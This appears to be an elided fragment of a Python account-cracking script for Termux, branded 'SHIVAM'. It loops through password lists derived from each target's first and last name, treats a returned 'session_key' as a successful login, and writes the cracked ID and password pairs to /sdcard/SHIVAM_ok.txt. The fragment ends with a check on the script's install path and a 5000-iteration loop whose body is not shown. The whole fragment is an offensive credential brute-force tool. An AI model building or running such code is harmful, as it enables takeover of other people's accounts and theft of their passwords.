...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[SHIVAM] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[SHIVAM-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SHIVAM_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/SHIVAM_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/SHIVAM' in datar:
        pass
else:
        for i in range(5000):
